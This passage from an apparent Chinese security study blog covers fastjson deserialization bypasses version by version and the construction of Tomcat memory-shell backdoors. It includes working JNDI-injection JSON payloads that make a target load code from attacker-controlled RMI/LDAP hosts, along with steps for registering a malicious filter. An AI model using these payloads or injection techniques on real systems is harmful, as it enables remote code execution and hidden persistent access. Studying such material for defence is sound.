class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/obj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="comment">// String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/test\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span></span><br><span class="line">JSON.parse(PoC);</span><br><span class="line"><span class="comment">//setAutoCommit方法</span></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line"><span class="comment">//构造JSON字符串</span></span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    jdbcRowSet.setDataSourceName(<span class="string">&quot;rmi://localhost:1099/obj&quot;</span>);</span><br><span class="line">    jdbcRowSet.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> JSON.toJSONString(jdbcRowSet);</span><br><span class="line">System.out.println(str);</span><br></pre></td></tr></table></figure><h3 id="1-2-25-1-2-41版本"><a href="#1-2-25-1-2-41版本" class="headerlink" title="1.2.25-1.2.41版本"></a>1.2.25-1.2.41版本</h3><p>​fastjson 1.2.25 针对以上利用链的修复思想体现在两方面：</p><ul><li><p>首先，将 TypeUtils.loadClass 替换为 this.config.checkAutoType()方法，新方法实现黑白名单机制，通过后才会调用TypeUtils.loadClass 方法获取类对象；</p></li><li><p>其次，checkAutoType()方法返回类对象时，会判断是否开启 AutoType，服务器配置该项如下时可通过，AutoType 默认关闭则会在此触发异常。</p><p>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</p><p>或者jvm参数：-Dfastjson.parser.autoTypeSupport&#x3D;true</p></li></ul><p>​接下来的漏洞问题，都是默认关闭了AutoTypeSupport之后，如何绕黑名单？可以看到1.2.25版本的TypeUtils.loadClass有如下逻辑，如果类名以 L 开头以；结尾，就会删去首尾的两个字符，恢复出正常类名在加载。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//POC:&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-42-版本修复及绕过"><a href="#1-2-42-版本修复及绕过" class="headerlink" title="1.2.42 版本修复及绕过"></a>1.2.42 版本修复及绕过</h3><p>​明文黑名单改为HASH值，checkcheckAutoType方法对传入的类名首尾字符做哈希运算，结果为指定值时就删去首尾的L和;得到真实类名，该类名将无法通过黑名单。绕过的方式为，将L和;字符复写，让他在过滤位置先删除一次。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POC:&#123;\<span class="string">&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,</span></span><br></pre></td></tr></table></figure><h3 id="1-2-43版本修复及绕过"><a href="#1-2-43版本修复及绕过" class="headerlink" title="1.2.43版本修复及绕过"></a>1.2.43版本修复及绕过</h3><p>​当传入类名首尾字符为 L 和;，进一步判断类名前两字符是否为 LL，如果为真则抛出异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//正常时，在这里去掉首位的L和;字符</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​显然，类名的形式为“Lclassnamel;”是正常的，只是类加载时需要将首尾的L和;字符去掉，可以在这里去掉，也可以在后续的TypeUtils.loadClass方法中去掉。但是，类名以LL字符开始，一定不正常，所以直接抛出异常。</p><p>​我们注意到，TypeUtils.loadClass方法不仅删除首尾的L和;字符，还会删除头部的[字符。但前面尝试下面POC时，会报错“希望得到[字符，却得到了，字符”。根据fastjson的贴心报错提示，在指定位置上添加字符，最终实现绕过。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//报错：JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json</span></span><br><span class="line">POC: &#123;\<span class="string">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,</span></span><br><span class="line"><span class="string">//最终版POC</span></span><br><span class="line"><span class="string">String PoC = &quot;</span>&#123;\<span class="string">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;</span></span><br><span class="line"><span class="string">String PoC = &quot;</span>&#123;\<span class="string">&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,</span></span><br></pre></td></tr></table></figure><h3 id="1-2-44版本修复及绕过"><a href="#1-2-44版本修复及绕过" class="headerlink" title="1.2.44版本修复及绕过"></a>1.2.44版本修复及绕过</h3><p>​首字符遇到[就直接抛出异常。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​前面的绕过方式都是利用TypeUtils.loadClass对首尾字符为L和;、对首字符为[时自动删除的特性，花式修改com.sun.rowset.JdbcRowSetImpl类名，来进行绕过。但是，1.2.44版本的修复阻断了这条道路，而新的方法将通过 JndiDataSourceFactory 类实现黑名单绕过。</p><p>​漏洞有新的依赖条件：标服务端存在 mybatis 的 jar 包，且版本需为 3.x.x 系列&lt;3.5.0 的版本。</p><p>​漏洞原理是，JndiDataSourceFactory的setProperties方法也存在JNDI注入点。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JndiDataSourceFactory的setProperties方法</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(<span class="string">&quot;data_source&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">this</span>.dataSource = (DataSource)initCtx.lookup(properties.getProperty(<span class="string">&quot;data_source&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Poc</span></span><br><span class="line"><span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> </span><br><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:7777/test\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//依赖 版本需为3.x.x系列&lt;3.5.0 的版本</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2-46版本修复及绕过（通杀fastjson1-2-24-至-1-2-47）"><a href="#1-2-46版本修复及绕过（通杀fastjson1-2-24-至-1-2-47）" class="headerlink" title="1.2.46版本修复及绕过（通杀fastjson1.2.24 至 1.2.47）"></a>1.2.46版本修复及绕过（通杀fastjson1.2.24 至 1.2.47）</h3><p>​fastjson 1.2.46 版本的黑名单扩充了JndiDataSourceFactory类，新的绕过方式将实现通杀fastjson1.2.24 至 1.2.47。这里先说结论。</p><p>​Poc先解析a部分，因为类名是“java.lang.Class”，不管是否开启autoTypeSupport都能过黑白名单，因为属于存在反序列化器的常见类，能通过deserializers.findClass加载到Class类，接下来获取到Class类对应的反序列化器MiscCodec，MiscCodec判断是Class类后，会调用底层的TypeUtils.loadClass方法加载val属性值对应的类，并将其放入TypeUtils.mappings缓存。</p><p>​然后，再解析Poc的b部分，不管是否开启autoTypeSupport，只要TypeUtils.mappings缓存里有该类名，就不会被黑名单抛出异常阻断类加载，最终能通过mappings缓存直接拿出该Class对象JdbcRowSetImpl。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;a\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    &#125;, \n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    \&quot;b\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/obj\&quot;, \n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;        \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parse(PoC);</span><br></pre></td></tr></table></figure><p>​这里我们系统认识下fastjson的解析逻辑，</p><p>​DefaultJSONParser类的parseObject方法，解析出字符串的每部分，先通过this.config.checkAutoType加载类，再获取类对应的反序列化器，执行反序列化恢复出具体的Object对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DefaultJSONParser类的parseObject方法</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="comment">//加载类</span></span><br><span class="line">    clazz = <span class="built_in">this</span>.config.checkAutoType(typeName, (Class)<span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">    <span class="comment">//获取反序列化器</span></span><br><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line">    <span class="comment">//反序列化，得到具体的Object对象</span></span><br><span class="line">    obj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​先看类加载部分，ParserConfig类的checkAutoType方法，负责fastjson类加载的安全性，曾经的类加载直接是TypeUtils.loadClass。当autoTypeSupport开启时，先用黑白名单过滤classname；没获得clazz时，会尝试从Mapping缓存，和一些已定义反序列化器的Class中寻找；还没找到clazz时，如果autoTypeSupport是关闭的，就会再次用黑白名单过滤，这样不管autoTypeSupport是否开启都进行了安全性过滤；最后，直接调用必杀技TypeUtils.loadClass加载类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ParserConfig类的checkAutoType方法</span></span><br><span class="line"><span class="number">1.</span>对前面的绕过，“L;”、“[”和复写等进行判断；</span><br><span class="line"><span class="number">2.</span>如果autoTypeSupport开启了，白黑名单过滤机制</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">this</span>.autoTypeSupport)&#123;</span><br><span class="line">    <span class="keyword">if</span>(白名单有className)&#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(黑名单有classname &amp;&amp; Mapping缓存.get(classname)==<span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">throw</span> Exception;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3.</span>尝试从Mapping缓存里直接获取Class对象            </span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">4.</span>尝试从一些常见类里获取Class对象</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">clazz = <span class="built_in">this</span>.deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5.</span>如果autoTypeSupport没开启，也会进入黑白名单过滤机制；最后调用原始的类加载TypeUtils.loadClass</span><br><span class="line"><span class="title function_">if</span><span class="params">(clazz!=<span class="literal">null</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">        <span class="comment">//上面的被黑名单过滤机制</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                </span><br></pre></td></tr></table></figure><p>​再来看反序列化部分，根据clazz对象找到反序列化器，java.lang.Class对应的反序列化器是MiscCodec类，其deserialze方法会解析出val对应的属性值，判断当前Class对象是否为一些常见类。关键来了，如果是Class.class对象，会进入MiscCodec类唯二的TypeUtils.loadClass位置，会传入val属性值记录的类名并加载。（另一个位置load(“Paths”)写死了）</p><p>​我们知道，TypeUtils.loadClass方法是原始的类加载方法，不设防，它会将加载的类放入TypeUtils.mappings里缓存。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MiscCodec类的deserialze方法</span></span><br><span class="line"><span class="number">1.</span>先操作字符串，解析处val属性对应的属性值；</span><br><span class="line"><span class="number">2.</span>判断当前Class对象是否为UUID.class、URL.class、File.class、Class.class等等常见类；</span><br><span class="line"><span class="number">3.</span>当判断当前Class对象是Class.class，调用如下方法加载类</span><br><span class="line">TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line"><span class="comment">//TypeUtils.loadClass方法</span></span><br><span class="line">clazz = contextClassLoader.loadClass(className);</span><br><span class="line"><span class="keyword">if</span> (cache) &#123;</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-48版本修复"><a href="#1-2-48版本修复" class="headerlink" title="1.2.48版本修复"></a>1.2.48版本修复</h3><p>​MiscCodec中将默认传入的cache变为false。</p><h3 id="1-2-62-1-2-66"><a href="#1-2-62-1-2-66" class="headerlink" title="1.2.62-1.2.66"></a>1.2.62-1.2.66</h3><p>​都是黑名单绕过。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需要autotype true</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span>&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>org.apache.shiro.jndi.JndiObjectFactory<span class="string">&quot;,&quot;</span>resourceName<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//192.168.80.1:1389/Calc&quot;&#125;</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><h3 id="1-2-80"><a href="#1-2-80" class="headerlink" title="1.2.80"></a>1.2.80</h3>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马复习篇</title>
      <link href="/2023/03/20/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%A4%8D%E4%B9%A0%E7%AF%87/"/>
      <url>/2023/03/20/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%A4%8D%E4%B9%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><h2 id="基本型内存马"><a href="#基本型内存马" class="headerlink" title="基本型内存马"></a>基本型内存马</h2><blockquote><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p><p>​内存马主要利用了Tomcat的部分组件会在内存中长期驻留的特性，只要将我们的恶意组件注入其中，就可以一直生效，直到容器重启。注入内存马实际上是模拟了在web.xml中写配置的过程，两者是一一对应的。</p></blockquote><p>1.Filter型，Servlet型，Listener型内存马</p><p>​Tomcat内存马有，Filter型，Servlet型，Listener型这三种，编写内存马，实际上是<strong>模拟在web.xml中写配置</strong>的过程。首先，通过request对象反射获取到<strong>StandardContext</strong>，然后实例化恶意类，然后将类及其相关信息绑定在StandardContext的对应属性上。具体来说：</p><ul><li>恶意filter对象实现了Filter接口，创建其对应的FilterDef、filterMap和filterConfig对象，因为已经获得了StandardContext对象，将这些信息<strong>注册到FilterDefs、filterMaps和filterConfigs</strong>即可。</li><li>恶意servlet对象实现了Servlet接口，将servlet对象封装在StandardWrapper，然后添加到StandardContext对象的<strong>children属性和servletMappings</strong>属性即可。</li><li>Listener主要分为三大类，<strong>ServletContext、Session和Request</strong>，根据其触发条件，最适合做内存马的是Request型Listener。恶意Listener对象实现了ServletRequestListener接口，调用standardContext的<strong>addApplicationEventListener方法</strong>，就能将恶意Listener对象注册到web应用的上下文信息中。</li></ul><ol start="2"><li>Agent型内存马</li></ol><p>​Agent型内存马，是通过attach模式将agent.jar加载到正在运行的目标程序上，agent.jar遍历目标程序上已经加载的类，对类进行重新定义，在<strong>能获取到线程request对象的关键方法上</strong>插桩恶意代码。比如<strong>插桩在ApplicationFilterChain的doFilter方法</strong>，所有请求都需要经过该方法，该方法的参数是request和response对象，在该位置获取request对象的参数和写入回显都很方便，等效于前面的Filter型内存马。</p><p>​运行时JVM提供了com.sun.tools.attach.VirtualMachine的api，可以通过这个类attach jvm，然后通过loadAgent()函数把agent加载进去。Agent型内存马，就是利用attach模式，将agent.jar加载到目标应用上，但需要首先将agent.jar上传到目标服务器，还需要在运行中的诸多Java程序中，猜中目标应用的名称。</p><p>3.反序列化注入内存马</p><blockquote><p>​确定线程request 对象的存储位置，寻找一条反射链的起点使得任意代码能够得着，可以想一想，tomcat 中哪些类是能够被够得着的，再让反射链足够短，就是这种思路的通式。</p></blockquote><p>​反序列化注入内存马时，需要通过反射获取到线程的request对象，首先要解决的是，就是确定当前线程的request对象和response对象会缓存在哪些位置？</p><p>(1).<strong>ApplicationFilterChain类的internalDoFilter方法</strong>，发现WRAP_SAME_OBJECT属性为true时，会将request对象和response对象缓存在lastServicedRequest、lastServicedResponse属性上。因此，第一次反序列化代码执行时，可以将WRAP_SAME_OBJECT属性修改为true；第二次请求时，会将request对象和response对象缓存，<strong>在反序列化点可以通过反射提取出缓存的对象</strong>，实现命令执行，并将返回结果写入response对象。但这样做有局限性，常见的反序列化点，比如shiro的rememberMe功能，是一个filter，而internalDoFilter方法会先执行filterChain，再缓存request、response对象，导致反序列化发生时，还没有缓存对象，从而不能回显。</p><p>(2).通过Filter型内存马的研究，我们知道获取到request对象后，就能获取到web应用的上下文信息StandardContext对象，将恶意filter对象的信息注册到FilterDefs、filterMaps和filterConfigs，从而实现内存马。这样的话，我们可以通过ApplicationFilterChain类的internalDoFilter方法缓存request对象，并在反序列化点通过反射获取，从而能<strong>在第二次请求时实现注入Filter型内存马</strong>。其实，就是后续命令执行和回显不再通过反序列化点了，而是通过一个恶意filter。</p><p>(3).既然上面的方式不能实现shiro环境下的通杀，Tomcat是否存在缓存线程request对象更通用的位置呢？Tomcat 启动后会创建<strong>Http11Processor对象</strong>，根据请求信息构建request、response对象，并存储起来。从Http11Processor对象继续搜索，我们可以找到一条从线程类加载器到request对象的反射路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webappClassLoaderBase（Thread.currentThread().getContextClassLoader()）-&gt;StandardService-&gt;Connector</span><br><span class="line">-&gt;protocolHandler（AbstractProtocol）-&gt; ConnectionHandler-&gt;RequestGroupInfo-&gt;RequestInfo-&gt;req-&gt;response</span><br></pre></td></tr></table></figure><p>​<strong>Requst、ServletRequest、RequstGroup、RequestInfo、RequestGroupInfo类都是能到达request对象的位置，因此内存马的挖掘要从这里考虑。</strong></p><p>(4).<strong>java-object-searcher</strong>实现了半自动化挖掘request对象，方案分两步，1.寻找存储有 request 对象的全局变量；2.半自动化反射搜索全局变量。实现技巧为：限制挖掘深度、设置黑名单、搜索继承的所有属性、推荐使用广度优先算法而不是深度优先。</p><h3 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h3><p>​正式开始实验前，回顾以前的记忆碎片，Filter型内存马关键是，通过反射获取StandardContext存储的filterMap、filterDef、filterConfig 对象，将恶意filter的信息注册上去。如何获取StandardContext对象？基本型Filter内存马，是通过上传jsp文件，当访问jsp文件时能过去到当前线程的request对象，从request对象找到通往StandardContext对象的反射路径。</p><p>​正常情况下，在Tomcat中注册一个filter，需要如下步骤：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.编写一个类，实现Filter接口，在doFilter中实现过滤逻辑</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter初始化创建....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行过滤操作......&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.在web.xml中配置该filter类的信息</span></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;filterDemo&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.bmsk.filter.filterDemo&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">&lt;filter-name&gt;filterDemo&lt;/filter-name&gt;</span><br><span class="line">&lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">&lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure><p>​在org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法，是创建filter链的过程，通过遍历filterMaps中的filter名称，获取filterConfigs中存储的filterConfig类，找到具体的filter类，将该filter类注册到filterConfig。</p><ul><li>filterDefs，filterDef存放了filter的定义，比如名称跟对应的类，对应web.xml的<code>&lt;filter&gt;</code>标签。</li><li>filterConfigs除了存放了filterDef还保存了当时的Context，即StandradContext。</li><li>FilterMaps则对应了web.xml中配置的<code>&lt;filter-mapping&gt;</code>标签，里面代表了各个filter之间的调用顺序。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ApplicationFilterFactory#createFilterChain方法</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">...</span><br><span class="line">var11 = filterMaps.length;</span><br><span class="line"><span class="keyword">for</span>(var12 = <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​根据Catalina Container的知识，我们知道Context代表一个web应用，Wrapper代表一个Servlet（页面），一个Context下可以包含多个Wrapper。想一下，ServletContext代表访问一个页面时的上下文信息，它需要有指向整个web应用Context（StandradContext）的引用，这样就能获取到整个应用的一些配置情况。而Filter型内存马就是围绕这条引用展开。</p><p>​首先通过请求上下文获取到获取到ServletContext（ApplicationContextFacade），通过反射获取其context得到ApplicationContext对象，再反射获取ApplicationContext的context属性，得到StandardContext对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从当前线程request对象，获取到ServletContext，它是ApplicationContext的封装</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="comment">//通过反射获取ApplicationContext（就把ApplicationContext看成实际意义上的页面上下文吧）</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span 